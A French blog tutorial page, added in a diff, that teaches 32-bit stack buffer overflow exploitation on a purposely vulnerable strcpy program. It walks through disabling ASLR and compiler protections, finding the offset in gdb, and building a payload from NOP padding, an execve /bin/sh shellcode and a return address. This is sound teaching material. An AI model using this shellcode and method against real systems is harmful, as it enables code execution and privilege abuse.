@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="fr">
+  <head>
+    
+      <title>Bufferoverflow 32bits :: RedFou52 - BlogPost — Bienvenue sur mon BlogPost</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Qu&amp;rsquo;est ce qu&amp;rsquo;un BufferOverflow ? Un BufferOverflow consiste à écraser la pile EIP d&amp;rsquo;un programme à un moment donné afin de compromettre une application.
+L&amp;rsquo;écrasement de la pile peut se faire par différents moyens, mais le principal problème vient d&amp;rsquo;une mauvaise gestion d&amp;rsquo;un buffer pendant la saisie par un utilisateur.
+Pourquoi ?  Faire crash une application (un DOS) Avoir un shell avec des droits prévilégiés Voler des informations ( Leak Memory ) Avoir un reverse shell ou un bind shell à distance  Pré-Requis Avant de commencer l&amp;rsquo;exploitation de notre binaire, il faut désactiver la protection ASLR activée par défaut sous linux."/>
+<meta name="keywords" content="linux, tuto, programmation, python"/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/binary/4-bufferoverflow/" />
+
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Bufferoverflow 32bits"/>
+<meta name="twitter:description" content="Initiation aux BufferOverflow sous linux"/>
+
+
+
+<meta property="og:title" content="Bufferoverflow 32bits" />
+<meta property="og:description" content="Initiation aux BufferOverflow sous linux" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/binary/4-bufferoverflow/" />
+<meta property="article:published_time" content="2020-09-12T18:38:44+02:00" />
+<meta property="article:modified_time" content="2020-09-12T18:38:44+02:00" /><meta property="og:site_name" content="RedFou52 - BlogPost" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">RedFou52 - BlogPost</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+
+
+
+    <span class="header__right">
+      
+        <nav class="menu">
+	<ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+	<li><a href="/tuto">Les Tutos</a></li>
+        
+      
+        
+	<li><a href="/secu">Sécurité</a></li>
+        
+      
+        
+	<li><a href="/writeup">Write-Up</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">
+            Autres catégories
+            <span class="menu__sub-inner-more-trigger-icon"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+          </li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+	      <li><a href="/binary">Exploit-Binaire</a></li>
+              
+            
+              
+	      <li><a href="/raspberry">Raspberry</a></li>
+              
+            
+              
+	      <li><a href="/nixos">NIXOS</a></li>
+              
+            
+              
+	      <li><a href="/arch">Archlinux</a></li>
+              
+            
+              
+	      <li><a href="/ml">MachineLearning</a></li>
+              
+            
+              
+	      <li><a href="/about">A propos !</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/tuto">Les Tutos</a></li>
+      
+    
+      
+        <li><a href="/secu">Sécurité</a></li>
+      
+    
+      
+        <li><a href="/writeup">Write-Up</a></li>
+      
+    
+      
+        <li><a href="/binary">Exploit-Binaire</a></li>
+      
+    
+      
+        <li><a href="/raspberry">Raspberry</a></li>
+      
+    
+      
+        <li><a href="/nixos">NIXOS</a></li>
+      
+    
+      
+        <li><a href="/arch">Archlinux</a></li>
+      
+    
+      
+        <li><a href="/ml">MachineLearning</a></li>
+      
+    
+      
+        <li><a href="/about">A propos !</a></li>
+      
+    
+  </ul>
+</nav>
+
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title"><a href="/binary/4-bufferoverflow/">Bufferoverflow 32bits</a></h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          12-09-2020
+        </span>
+
+        
+      
+
+      <span class="post-author">— Ecrit par Eidorian</span>
+      
+        <span class="post-read-time">— 6 Minutes</span>
+      
+    </div>
+
+    
+
+    
+      
+        <img src="/img/fr/binary/4-binary-bufferoverflow.png" class="post-cover" />
+      
+    
+
+    <div class="post-content">
+      
+        <h2>Table of Contents</h2>
+        <aside class="table-of-contents"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#pourquoi-">Pourquoi ?</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#code">Code</a></li>
+    <li><a href="#compilation">Compilation</a></li>
+    <li><a href="#explication">Explication</a></li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#première-exécution">Première exécution</a></li>
+        <li><a href="#overflow-de-a">Overflow de &ldquo;A&rdquo;</a></li>
+        <li><a href="#calcule-du-padding">Calcule du padding</a></li>
+      </ul>
+    </li>
+    <li><a href="#le-payload">Le payload</a>
+      <ul>
+        <li><a href="#le-shellcode">Le shellcode</a></li>
+        <li><a href="#le-padding">Le padding</a></li>
+        <li><a href="#le-sip">Le SIP</a></li>
+        <li><a href="#création-du-payload">Création du payload</a></li>
+        <li><a href="#pwned-">Pwned !</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></aside>
+      
+      <h1 id="quest-ce-quun-bufferoverflow-">Qu&rsquo;est ce qu&rsquo;un BufferOverflow ?</h1>
+<p>Un BufferOverflow consiste à écraser la pile EIP d&rsquo;un programme à un moment donné afin de compromettre une application.</p>
+<p>L&rsquo;écrasement de la pile peut se faire par différents moyens, mais le principal problème vient d&rsquo;une mauvaise gestion d&rsquo;un buffer pendant la saisie par un utilisateur.</p>
+<h2 id="pourquoi-">Pourquoi ?</h2>
+<ul>
+<li>Faire crash une application (un DOS)</li>
+<li>Avoir un shell avec des droits prévilégiés</li>
+<li>Voler des informations ( Leak Memory )</li>
+<li>Avoir un reverse shell ou un bind shell à distance</li>
+</ul>
+<h1 id="pré-requis">Pré-Requis</h1>
+<p>Avant de commencer l&rsquo;exploitation de notre binaire, il faut désactiver la protection ASLR activée par défaut sous linux.</p>
+<p>Pour la désactiver entrez la commande suivante :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">しのぶ » sudo sysctl kernel.randomize_va_space<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</code></pre></div><p>Je vous conseil d&rsquo;avoir une bonne connaissance sur la gestion de la mémoire, sur l&rsquo;assembleur et sur l&rsquo;utilisation de GDB avant de continuer.</p>
+<h1 id="buffer_32">buffer_32</h1>
+<h2 id="code">Code</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">vulnerable</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argument){
+    <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">100</span>];
+    strcpy(buffer, argument);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[]) {
+    vulnerable(argv[<span style="color:#ae81ff">1</span>]);
+    printf(<span style="color:#e6db74">&#34;Fin du Programme!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><h2 id="compilation">Compilation</h2>
+<p>Si vous êtes en 64Bits, il vous faut installer les librairies 32Bits :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">しのぶ » sudo apt install gcc-multilib 
+</code></pre></div><p>Sur Archlinux :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">しのぶ » sudo pacman -S lib32-glibc lib32-gcc-libs
+</code></pre></div><p>Pour compiler le programme, utilisez <code>gcc</code> avec les paramètres suivant :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">しのぶ » gcc -m32 -fno-stack-protector -z execstack -o buffer_32 buffer_32.c -no-pie
+</code></pre></div><h2 id="explication">Explication</h2>
+<p>Le binaire est assez simple, il prend une chaîne de caractère.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">int</span> main(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[])
+</code></pre></div><p>Cette chaîne est ensuite envoyée comme argument à la fonction <code>vulnerable()</code> afin d&rsquo;être copié dans un buffer d&rsquo;une taille de 100 avec <code>strcpy()</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">[...]
+vulnerable(argv[<span style="color:#ae81ff">1</span>]);
+[...]
+strcpy(buffer, argv[<span style="color:#ae81ff">1</span>]);
+</code></pre></div><p>Si l&rsquo;utilisateur met une chaîne d&rsquo;une taille inférieur à 100, le programme s&rsquo;execute normalement.</p>
+<p>En revanche, si la chaîne fait plus d&rsquo;une centaine de caratères, plus grand que le buffer donc, ça plante ! Car la taille alloué au buffer ne sera pas suffisante !</p>
+<p><img src="/img/fr/binary/4-execution-buffer.png" alt="4-execution-buffer.png"></p>
+<p>Dans la capture d&rsquo;écran, on peut voir une première utilisation dite &ldquo;normale&rdquo; du programme.</p>
+<p>La deuxième commande va injecter avec l&rsquo;aide de python 101 caractère <strong>&ldquo;A&rdquo;</strong>, ce qui va faire planter le programme. (segmentation fault)</p>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="première-exécution">Première exécution</h3>
+<p>Très bien, maintenant que l&rsquo;on a vu notre programme planté, on va commencer à l&rsquo;exploiter.</p>
+<p>Nous allons ouvrir notre programme avec l&rsquo;outil <code>gdb</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">しのぶ » gdb buffer_32
+</code></pre></div><p>J&rsquo;utilise le plugin <a href="https://github.com/hugsy/gef">gef</a> pour avoir une meilleure expérience de jeu ;)</p>
+<p>On va executer une première fois notre programme avec la commande <code>run</code>
+<img src="/img/fr/binary/4-gef-run.png" alt="4-gef-run.png"></p>
+<p>Pour le moment ce qui nous intéresse, c&rsquo;est le résultat du &ldquo;ltrace&rdquo; en vert, on peut voir des fonctions intéressantes comme :</p>
+<ul>
+<li><strong>main()</strong></li>
+<li><strong>vulnerable()</strong></li>
+</ul>
+<p>On peut continuer notre analyse avec la commande <code>disas</code> qui va nous permetre d&rsquo;afficher le code assembleur d&rsquo;une fonction, on commence avec le main.</p>
+<p><img src="/img/fr/binary/4-disas-main.png" alt="4-disas-main.png"></p>
+<p>En rouge on peut voir où est appellé la fonction <code>vulnerable()</code>.</p>
+<p>Même manipulation qu&rsquo;avec le main.</p>
+<p><img src="/img/fr/binary/4-disas-vulnerable.png" alt="4-disas-vulnerable.png"></p>
+<p>En rouge cette fois on peut voir notre fonction <code>strcpy()</code> vulnérable au buffer.</p>
+<h3 id="overflow-de-a">Overflow de &ldquo;A&rdquo;</h3>
+<p>Bien maintenant, passons au buffer, nous allons refaire le même crash du début mais cette fois avec <code>gef</code> pour voir ce qu&rsquo;il se passe.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤ run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</code></pre></div><p><img src="/img/fr/binary/4-buffer-A.png" alt="4-buffer-A.png"></p>
+<p>Maintenant, on vois bien pourquoi le programme plante.<br>
+EIP qui est sensé contenir l&rsquo;adresse de l&rsquo;instruction suivante se retrouve rempli avec <code>AAAA</code> ce qui donne en hexadecimal <code>0x41414141</code>.</p>
+<h3 id="calcule-du-padding">Calcule du padding</h3>
+<p>Maintenant que l&rsquo;on peut voir le contenu de EIP, nous allons trouver le padding, c&rsquo;est à dire le nombre de caractères qu&rsquo;il faut pour arriver jusqu&rsquo;à EIP.<br>
+L&rsquo;objectif final est de pouvoir manipuler la valeur de EIP avec par exemple <code>ABCD</code>.</p>
+<p>Pour ce faire, nous allons créer un pattern :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤  pattern create <span style="color:#ae81ff">116</span>
+</code></pre></div><p>Lancer le programme avec le pattern :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤  run aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaab
+</code></pre></div><p>Faire une recherche du pattern en récupérant l&rsquo;adresse de EIP :
+<img src="/img/fr/binary/4-EIP-pattern.png" alt="4-EIP-pattern.png"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤  pattern search 0x62616164
+</code></pre></div><p><img src="/img/fr/binary/4-EIP-pattern-offset.png" alt="4-EIP-pattern-offset.png"></p>
+<p>Nous avons bien une taille de <strong>112</strong> avant d&rsquo;écraser <strong>EIP</strong>.</p>
+<p>Maintenant, nous allons créer un pattern de 112 <strong>&ldquo;A&rdquo;</strong> et y ajouter <strong>&ldquo;ABCD&rdquo;</strong> à la fin, si tout va bien, on devrait voir apparaître &ldquo;ABCD&rdquo; dans <strong>EIP</strong>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤  run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCD
+</code></pre></div><p><img src="/img/fr/binary/4-EIP-ABCD.png" alt="4-EIP-ABCD.png"></p>
+<p>Bingo !</p>
+<h2 id="le-payload">Le payload</h2>
+<p>Pour la création de notre payload, il nous faut :</p>
+<ul>
+<li>La distance vers EIP</li>
+<li>Un shellcode</li>
+<li>L&rsquo;adresse à laquelle commence le shellcode (SIP)</li>
+</ul>
+<p>Notre payload devrais ressembler à ça :</p>
+<table>
+<thead>
+<tr>
+<th>SHELLCODE (n)</th>
+<th>PADDING (112 - n)</th>
+<th>SIP</th>
+</tr>
+</thead>
+</table>
+<p>Le padding devra prendre en compte la taille du shellcode car celui-ci sera techniquement dans le padding.</p>
+<h3 id="le-shellcode">Le shellcode</h3>
+<p>Pour le shellcode, je vais en utiliser un tout fait disponible à cette adresse : <a href="http://shell-storm.org/shellcode/files/shellcode-827.php">shell-storm.org/shellcode</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80</span><span style="color:#e6db74">&#34;</span>
+</code></pre></div><p>C&rsquo;est un shellcode x86 de 23 bytes qui va executer <code>/bin/sh</code>.</p>
+<p>Notre shellcode fait donc 23 bytes, ce qui va nous faire un padding de 89.</p>
+<table>
+<thead>
+<tr>
+<th>SHELLCODE (23)</th>
+<th>PADDING (89)</th>
+<th>SIP</th>
+</tr>
+</thead>
+</table>
+<h3 id="le-padding">Le padding</h3>
+<p>Pour le padding, c&rsquo;est assez simple, nous allons mettre des instructions <code>\x90</code> , NOP, à la place de nos &ldquo;A&rdquo; pour éviter une mauvaise interprétation des &ldquo;A&rdquo; par notre programme.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">89</span>
+</code></pre></div><h3 id="le-sip">Le SIP</h3>
+<p>Le SIP est donc l&rsquo;adresse du début de notre shellcode, cette adresse va être ajouté dans EIP ce qui va faire pointer EIP sur notre shellcode.</p>
+<p>Pour trouver le SIP, je vais vous monter 2 méthodes.</p>
+<ul>
+<li>
+<p>La première avec GDB qui va nous afficher l&rsquo;adresse du premier argument de la fonction <code>strcpy</code></p>
+</li>
+<li>
+<p>La deuxième sera un peu plus longue mais tout aussi intéressante, en utilisant le dump d&rsquo;un crash et en parcourant la stack avec gdb.</p>
+</li>
+</ul>
+<h3 id="création-du-payload">Création du payload</h3>
+<p>Avec python je vais enregistrer mon payload dans un fichier <code>payload.bin</code></p>
+<p>Voici mon script :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc9\x31\xd2\x31\xc0\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80</span><span style="color:#e6db74">&#34;</span>
+
+
+padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">89</span>
+
+SIP <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x41\x41\x41</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># SIP = &#34;AAAA&#34;</span>
+
+payload <span style="color:#f92672">=</span> shellcode <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> SIP
+
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;payload.bin&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+    f<span style="color:#f92672">.</span>write(payload)
+
+
+</code></pre></div><p>Pour le moment on va mettre  &ldquo;AAAA&rdquo; dans SIP car on ne le connait pas encore.</p>
+<p>Pour executer le payload, je vous conseil d&rsquo;utiliser python2.</p>
+<h4 id="méthode--gdb">Méthode : GDB</h4>
+<p>Pour commencer, on va placer un breakpoint sur la fonction <code>strcpy()</code> qui se trouve dans <code>vulnerable()</code>.</p>
+<p><img src="/img/fr/binary/4-strcpy.png" alt="4-strcpy.png"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤ b * 0x080491a3
+</code></pre></div><p>Ensuite on execute notre payload comme ceci :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤  r <span style="color:#66d9ef">$(</span>cat payload.bin<span style="color:#66d9ef">)</span>
+</code></pre></div><p><img src="/img/fr/binary/4-strcpy-sip-gdb.png" alt="4-strcpy-sip-gdb.png"></p>
+<p>Arrivé sur le breakpoint , on peut voir dans la section <em>arguments guessed</em> notre fonction <code>strcpy()</code> qui prend deux arguments, dans le carré vert.</p>
+<p>Ici seulement la première adresse en rouge nous intéresse.</p>
+<p>Nous voici donc notre SIP : <code>0xffffd17c</code></p>
+<p>Pensez à le mettre en Little-Indian dans votre code python :
+<code>\x7c\xd1\xff\xff</code></p>
+<h4 id="méthode--coredump">Méthode : COREDUMP</h4>
+<p>Pour la méthode coredump, vous allez avoir besoin de l&rsquo;outil <code>coredumpctl</code>.</p>
+<p>On va faire crasher notre application avec notre payload python. (Celui qui contient les &ldquo;AAAA&rdquo; en SIP)</p>
+<p><img src="/img/fr/binary/4-coredumped.png" alt="4-coredumped.png"></p>
+<p>Comme vous pouvez le voir, le programme retourne un <code>segmentation fault (core dumped)</code> ce qui est normal.</p>
+<p>Maintenant, on va chercher ce dump :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">しのぶ » coredumpctl list
+</code></pre></div><p><img src="/img/fr/binary/4-coredumpctl-list.png" alt="4-coredumpctl-list.png"></p>
+<p>Une liste de dump est affichée, on récupère le PID du tout dernier.</p>
+<p>Ensuite on ouvre le dump avec gdb :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">しのぶ » coredumpctl gdb <span style="color:#ae81ff">7524</span>
+</code></pre></div><p>On affiche la stack à partir du registre ESP:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤  x/80x $esp-180
+</code></pre></div><p><img src="/img/fr/binary/4-stack-esp.png" alt="4-stack-esp.png">
+<em>lecture de droite à gauche par colonne et de gauche à droite par ligne</em></p>
+<p>Vous devriez avoir quelque chose comme ceci :</p>
+<ul>
+<li>En vert nous avons le début de notre shellcode (31,c9,31,2d)</li>
+<li>En jaune on a le &ldquo;AAAA&rdquo; de notre payload</li>
+<li>En violet les NOP</li>
+<li>Et enfin en rouge notre SIP</li>
+</ul>
+<p>Alors attention ! Il ne faut pas toujours prendre l&rsquo;adresse de droite, il faut prendre l&rsquo;adresse de début du shellcode.</p>
+<p>Bien souvent il faut incrémenter l&rsquo;adresse jusqu&rsquo;a tomber dessus, une bonne technique est d&rsquo;utiliser la commande suivante :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤  x/1xb &lt;address&gt;
+</code></pre></div><p>Vous placez votre adresse et augmentez de 1 (en hexa) jusqu&rsquo;à tomber sur votre &ldquo;\x31&rdquo; :
+<img src="/img/fr/binary/4-found-sip.png" alt="4-found-sip.png"></p>
+<h3 id="pwned-">Pwned !</h3>
+<p>Maintenant que votre payload est complet, il ne vous reste plus qu&rsquo;à l&rsquo;executer !</p>
+<p><img src="/img/fr/binary/4-pwned-.png" alt="4-pwned-.png"></p>
+
+    </div>
+    
+
+
+    
+      
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">@RedFou52 - Eidorian - 2020</div>
+    
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
